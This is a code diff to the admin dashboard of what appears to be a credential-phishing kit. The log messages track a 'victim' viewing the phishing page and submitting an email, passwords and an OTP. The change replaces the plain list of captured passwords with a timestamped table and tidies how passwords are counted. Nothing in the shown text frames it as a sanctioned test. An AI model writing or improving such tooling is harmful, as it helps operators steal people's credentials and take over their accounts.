@@ -27,6 +27,8 @@ import {
   DropdownMenuTrigger,
 } from "@/components/ui/dropdown-menu";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
+import { format } from "date-fns";
 
 type ConfigFormData = {
   targetEmail: string;
@@ -218,7 +220,9 @@ export function AdminDashboard() {
     const log = [];
     const { victim } = state;
 
-    if (!victim.email && Object.values(victim.passwords).length === 0 && !victim.otp) {
+    const passwordCount = state.victim.passwords ? Object.values(state.victim.passwords).length : 0;
+
+    if (!victim.email && passwordCount === 0 && !victim.otp) {
         log.push({ icon: Eye, text: `Victim is viewing the phishing page.` });
     }
 
@@ -226,8 +230,7 @@ export function AdminDashboard() {
       log.push({ icon: Mail, text: `Victim submitted email: ${victim.email}` });
     }
     
-    if (victim.passwords && Object.values(victim.passwords).length > 0) {
-      const passwordCount = Object.values(victim.passwords).length;
+    if (passwordCount > 0) {
       log.push({ icon: KeyRound, text: `Captured ${passwordCount} password(s).` });
     }
     
@@ -248,6 +251,7 @@ export function AdminDashboard() {
   };
 
   const attackLog = getAttackLog();
+  const capturedPasswords = state?.victim.passwords ? Object.values(state.victim.passwords) : [];
 
   return (
     <div className="w-full max-w-6xl mx-auto">
@@ -391,12 +395,31 @@ export function AdminDashboard() {
                     </div>
                     <div className="space-y-2">
                         <Label>Captured Passwords</Label>
-                        <div className="p-4 bg-muted rounded-lg space-y-2">
-                        {state?.victim.passwords && Object.values(state.victim.passwords).length > 0 ? (
-                          <ul className="list-disc list-inside space-y-1">
-                            {Object.values(state.victim.passwords).map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
-                          </ul>
-                        ) : <div className="font-mono text-sm">---</div>}
+                        <div className="border rounded-lg">
+                            <Table>
+                                <TableHeader>
+                                    <TableRow>
+                                        <TableHead className="w-[200px]">Timestamp</TableHead>
+                                        <TableHead>Password</TableHead>
+                                    </TableRow>
+                                </TableHeader>
+                                <TableBody>
+                                    {capturedPasswords.length > 0 ? (
+                                        capturedPasswords.map((p, i) => (
+                                            <TableRow key={i}>
+                                                <TableCell className="font-mono text-xs">{format(new Date(p.timestamp), "yyyy-MM-dd HH:mm:ss")}</TableCell>
+                                                <TableCell className="font-mono text-sm">{p.value}</TableCell>
+                                            </TableRow>
+                                        ))
+                                    ) : (
+                                        <TableRow>
+                                            <TableCell colSpan={2} className="h-24 text-center">
+                                                No passwords captured yet.
+                                            </TableCell>
+                                        </TableRow>
+                                    )}
+                                </TableBody>
+                            </Table>
                         </div>
                     </div>
                     <div className="space-y-2">
@@ -514,7 +537,3 @@ export function AdminDashboard() {
     </div>
   );
 }
-
-    
-
-    
